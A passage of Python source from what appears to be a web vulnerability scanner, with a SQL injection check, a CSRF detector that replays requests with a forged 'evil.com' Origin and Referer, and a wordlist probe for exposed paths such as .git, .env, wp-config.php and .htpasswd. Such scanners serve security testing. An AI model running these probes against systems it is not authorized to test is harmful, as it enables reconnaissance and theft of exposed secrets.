            except Exception:
                continue
            if is_blocked(ru) or ru.status >= 400 or not (ru.body or "").strip():
                continue
            if marker in (ru.body or ""):
                return Result("sqli", CONFIRMED,
                              [f"UNION-based (DBMS: {dbms}): marker surfaced via UNION SELECT"],
                              payload=pl, severity="critical",
                              proof={"dbms": dbms, "union": True, "marker": marker})
    return Result("sqli", SAFE, ["no per-DBMS time/union signal"])


# ═════════════════════════════════════════════════════════════════════════════
#  CSRF detector: check state-changing endpoints for anti-CSRF tokens + origin validation
# ═════════════════════════════════════════════════════════════════════════════
_CSRF_BODY_PATTERNS = (
    r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    r'__csrf[_-]?',
    r'csrfmiddlewaretoken',
    r'authenticity[_-]?token',
    r'xsrf[_-]?token',
    r'\/csrf\/',
    r'_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    r'\bnonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
)


def detect_csrf(send, method: str, url: str, headers: dict, cookies: dict,
                 body: str | None = None, content_type: str = "",
                 target_netloc: str = "") -> Result:
    """Check if a state-changing endpoint (POST/PUT/DELETE/PATCH) is protected against CSRF.

    1. Detect anti-CSRF tokens in the form body or custom headers.
    2. Check Origin/Referer validation by sending with forged values.
    3. Test same-origin vs cross-origin response difference.
    """
    if method.upper() not in ("POST", "PUT", "DELETE", "PATCH"):
        return Result("csrf", SAFE, ["not a state-changing method (GET/HEAD)"])

    signals, proof = [], {}
    body_text = body or ""

    # ── 1) Token-based CSRF protection ──
    has_token = False
    for pat in _CSRF_BODY_PATTERNS:
        m = re.search(pat, body_text, re.I)
        if m:
            has_token = True
            proof["token"] = m.group(0)[:60]
            break
    # Also check for CSRF token in headers (X-CSRF-Token, X-XSRF-Token)
    if not has_token:
        ch = {k.lower(): v for k, v in headers.items()}
        for hdr in ("x-csrf-token", "x-xsrf-token", "csrf-token", "x-csrftoken"):
            if hdr in ch:
                has_token = True
                proof["token_header"] = hdr
                break

    # ── 2) Origin/Referer validation ──
    origin_validated = False
    try:
        r_orig = send(method, url, headers, cookies, body, True)
        r_forge = send(method, url, {**headers, "Origin": "https://evil.com",
                                       "Referer": "https://evil.com/page"},
                       cookies, body, True)
        if r_orig is not None and r_forge is not None and not is_blocked(r_orig):
            # If both succeed, Origin/Referer is NOT validated → CSRF possible
            if not is_blocked(r_forge) and r_forge.status == r_orig.status:
                origin_validated = False
                proof["origin_forge"] = True
            else:
                origin_validated = True
                proof["origin_forge"] = False
    except Exception:
        pass

    # ── 3) State-change verification ──
    # CSRF is only meaningful if the POST actually changes state. A POST that returns
    # the same HTML as GET (content page) is NOT a state-changing endpoint.
    stateful = True
    try:
        r_get = send("GET", url, headers, cookies, "", False)
        if r_orig is not None and r_get is not None and r_get.body and r_orig.body:
            # Compare response bodies: if POST returns nearly identical HTML as GET → static page
            _get_len = len(r_get.body)
            _post_len = len(r_orig.body)
            if _get_len > 0 and abs(_post_len - _get_len) / _get_len < 0.15:
                stateful = False
                proof["same_page"] = True
    except Exception:
        pass

    # ── 4) Conclusion ──
    # Without token AND without origin validation → vulnerable (only if stateful)
    if not has_token and not origin_validated:
        if not stateful:
            return Result("csrf", SAFE,
                          ["POST returns same page as GET — not a state-changing endpoint"],
                          proof=proof)
        # Without an active replay hook we cannot confirm cross-origin acceptance —
        # return PROBABLE so it shows for manual review but is not auto-reported as CONFIRMED
        return Result("csrf", PROBABLE,
                      [f"No anti-CSRF token found in body/headers and no Origin/Referer validation "
                       f"on {method} {url[:50]}"],
                      severity="medium", proof=proof)
    if not has_token and origin_validated is False:
        if not stateful:
            return Result("csrf", SAFE,
                          ["POST returns same page as GET — not a state-changing endpoint"],
                          proof=proof)
        return Result("csrf", PROBABLE,
                      ["No anti-CSRF token; Origin/Referer validation could not be determined"],
                      severity="medium", proof=proof)
    return Result("csrf", SAFE, [f"CSRF protected (token={'yes' if has_token else 'no'}, "
                                 f"origin={'validated' if origin_validated else 'none'})"])


# ═════════════════════════════════════════════════════════════════════════════
#  Wordlist-based path / file discovery (DirBuster-style)
# ═════════════════════════════════════════════════════════════════════════════
_WORDLIST_PATHS = [
    # Admin / Management
    "/admin", "/admin/", "/administrator", "/manager", "/management", "/console",
    "/admin/login", "/admin/panel", "/admin/dashboard", "/cpanel", "/panel",
    # Version control
    "/.git/", "/.git/config", "/.git/HEAD", "/.gitignore", "/.svn/", "/.svn/entries",
    "/.hg/", "/.bzr/",
    # Config & env
    "/.env", "/.env.example", "/.env.local", "/.env.production", "/.env.development",
    "/config/", "/config.php", "/configuration.php", "/settings", "/wp-config.php",
    "/app.config", "/web.config", "/application.yml",
    # Backup & source
    "/backup", "/backup/", "/db_backup", "/dump", "/sql", "/database",
    "/src/", "/source/", "/dist/", "/build/",
    # API documentation
    "/api/", "/api/v1/", "/api/v2/", "/api/swagger.json", "/api/swagger.yaml",
    "/api/docs", "/api/doc", "/openapi.json", "/graphql", "/graphiql",
    "/swagger", "/swagger-ui", "/swagger-resources",
    # Sensitive files
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/security.txt", "/.well-known/security.txt",
    # Frameworks
    "/wp-admin", "/wp-content", "/wp-includes", "/wp-json",
    "/laravel/.env", "/vendor/", "/composer.json", "/node_modules/",
    # Cloud & CI/CD
    "/.aws/", "/.azure/", "/.google/", "/cloud.yaml",
    "/.circleci/", "/.jenkins/", "/.travis.yml", "/Dockerfile", "/docker-compose.yml",
    "/Jenkinsfile", "/.gitlab-ci.yml",
    # Logs & debug
    "/log", "/logs", "/error.log", "/debug.log", "/access.log", "/install.log",
    "/phpinfo.php", "/info.php", "/test.php", "/debug/",
    # Common web paths
    "/actuator", "/actuator/health", "/actuator/info", "/actuator/env",
    "/.well-known/", "/.well-known/apple-app-site-association",
    "/.well-known/assetlinks.json",
    # JS source maps (for source code leak)
    "/static/js/", "/assets/js/",
    # Auth endpoints
    "/login", "/signin", "/register", "/signup", "/forgot-password", "/reset-password",
    "/oauth", "/oauth2", "/oauth/token", "/oauth/authorize",
    "/.htaccess", "/.htpasswd",
]

# Status codes that indicate the resource EXISTS
_WORDLIST_VALID_STATUSES = frozenset({200, 201, 202, 204, 301, 302, 303, 307, 308, 401, 403, 500})


def discover_paths(fetch, base_url: str = "", max_findings: int = 30, wordlist: tuple = ()) -> list:
    """Probe paths from a wordlist and report accessible files/directories.

    fetch(path: str) -> Resp | None  where path is relative to base_url.
    Returns a list of finding dicts similar to detect_missing_headers.
    """
    paths = wordlist or _WORDLIST_PATHS
    out = []
    tried = 0
    for p in paths:
        if len(out) >= max_findings:
            break
        try:
            r = fetch(p)
        except Exception:
            continue
        if r is None:
            continue
        tried += 1
        if r.status not in _WORDLIST_VALID_STATUSES:
            continue
        # Skip redirects to the same page (login redirects)
        loc = (r.headers or {}).get("location", "")
        if r.status in (301, 302, 303, 307, 308) and base_url and base_url.rstrip("/") in loc:
            continue
        severity = "info"
        is_html = bool(r.body and (r.body.lstrip()[:20].startswith("<!DOCTYPE") or
                                    r.body.lstrip()[:10].startswith("<html") or
                                    r.body.lstrip()[:10].startswith("<HTML")))
        is_redirect = r.status in (301, 302, 303, 307, 308)
        # Upgrade for actual sensitive data exposure
        if any(k in p for k in (".git", ".env", "backup", "dump", ".log")):
            severity = "critical"
        elif any(k in p for k in ("phpinfo", "actuator")):
            severity = "high"
        # Downgrade non-sensitive responses even if path looks suspicious
        body_lower = (r.body or "").lower()[:300]
        loc_lower = loc.lower()
        if severity != "info":
            is_login = (
                is_redirect and
                any(m in loc_lower for m in ("/login", "/signin", "/auth/", "sign_in"))
            ) or (
                r.status not in (301, 302, 303, 307, 308, 403, 401) and
                any(m in body_lower for m in ("sign in to", "log in", "password",
                                               "login form", "forgot password",
                                               "create account", "sign up"))
            )
            if is_login or r.status == 403:
                severity = "info"
            # Downgrade sensitive paths that return HTML pages (SPA catch-all) or redirect externally
            if is_html or (is_redirect and severity != "info"):
                severity = "info"
        detail_parts = []
        if r.status == 403:
            detail_parts.append("403 Forbidden (exists but access denied)")
        elif r.status == 401:
            detail_parts.append("401 Unauthorized (exists but requires auth)")
        elif r.status in (301, 302, 303, 307, 308):
            detail_parts.append(f"Redirects to {loc[:80]}")
        elif r.status == 500:
            detail_parts.append("500 Internal Server Error (may leak stack traces)")
        else:
            body_sample = (r.body or "")[:200].strip()
            if body_sample:
                if re.search(r"<title>\s*Index of /", body_sample, re.I):
                    detail_parts.append("Directory listing enabled")
                    if severity == "info":
                        severity = "medium"
                else:
                    detail_parts.append(f"Returns {r.status} ({len(r.body or '')} bytes)")
        out.append({
            "vuln_type": "INFO DISCLOSURE",
            "severity": severity,
            "url": base_url.rstrip("/") + p,
            "detail": f"Exposed path: {p} — " + "; ".join(detail_parts),
            "evidence": (r.body or "")[:300],
            "payload": p,
            "cvss": "5.3" if severity == "medium" else "7.5",
            "proof": {"status": r.status, "path": p,
                      "location": loc if loc else None},
            "recommendation": "Remove or restrict access to this path; review for sensitive data exposure.",
        })
    return out
